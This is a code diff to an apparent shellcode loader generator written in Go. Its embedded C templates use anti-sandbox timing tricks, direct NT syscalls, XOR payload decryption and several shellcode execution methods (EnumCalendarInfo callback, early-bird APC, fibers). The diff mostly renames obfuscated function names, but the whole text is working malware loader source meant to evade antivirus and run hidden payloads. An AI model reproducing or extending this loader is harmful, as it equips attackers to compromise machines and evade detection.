@@ -1,11 +1,7 @@
 package Loader
 
-//VAVPVM	NtProtectVirtualMemory
-//VAVWVM	NtWriteVirtualMemory
-//VAVAVM	NtAllocateVirtualMemory
-
 // 反沙箱代码
-// 在主函数中调用
+// 在主函数中调用 去判断质数
 var __c__sandbox = `
 	Love(1000000000000002493);
 	Love(1000000000000002481);
@@ -23,11 +19,11 @@ var __c__sandbox = `
 // 回调函数加载
 var __c__syscall_callback = `
     DWORD oldProtect;
-    VAVAVM(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
+    VAV_NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
 	Love(1000000000000002049);
-    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
+    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
 	Love(1000000000000002049);
-    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
+    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
 	Love(1000000000000002049);
 	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
 `
@@ -40,8 +36,8 @@ var __c__syscall__earlyBird = `
 
     QueueUserAPC((PAPCFUNC)shellAddress, GetCurrentThread(), NULL);
     testAlert();
-    //VAVAVM(hProcess, &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    //VAVWVM(hProcess, addr, xpp, length, &bytesWritten);
+    //VAV_NtAllocateVirtualMemory(hProcess, &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    //VAV_NtWriteVirtualMemory(hProcess, addr, xpp, length, &bytesWritten);
     ////LPVOID addr1 = VirtualAlloc(NULL, sizeof(xpp), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     ////RtlMoveMemory(addr1, xpp,length);
     ////QueueUserAPC((PAPCFUNC)addr1, GetCurrentThread(), NULL);
@@ -53,13 +49,13 @@ var __c__syscall__earlyBird = `
 var __c__syscall__fiber = `
     DWORD oldProtect;
     PVOID mainFiber = ConvertThreadToFiber(NULL);
-    VAVAVM(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
+    VAV_NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
 	Love(1000000000000002049);
-    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
+    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
 	Love(1000000000000002049);
-    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
+    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
 	Love(1000000000000002049);
-	VAVWVM(GetCurrentProcess(), addr, xpp, length, NULL);
+	VAV_NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
 
     PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)addr, NULL);
 
@@ -161,7 +157,7 @@ char json1[] = "{\"name\":\"John\",\"age\":30,\"city\":\"New York\"}";
 char json2[] = "{\"product\":\"Apple iPhone 13\",\"price\":999,\"currency\":\"USD\"}";
 
 
-void ShowTime(char* data, size_t data_len, char* key, size_t key_len) {
+void My_Xor(char* data, size_t data_len, char* key, size_t key_len) {
     int j;
     j = 0;
     for (int i = 0; i < data_len; i++) {
@@ -188,7 +184,7 @@ int main() {
 	REPLACR_OBFUSCATION
     unsigned char key[] = "%s";
     unsigned int key_len = sizeof(key);
-    ShowTime((char*)xpp, length, (char*)key, key_len);
+    My_Xor((char*)xpp, length, (char*)key, key_len);
 
 	SIZE_T allocationSize = length;
 	void* addr = NULL;
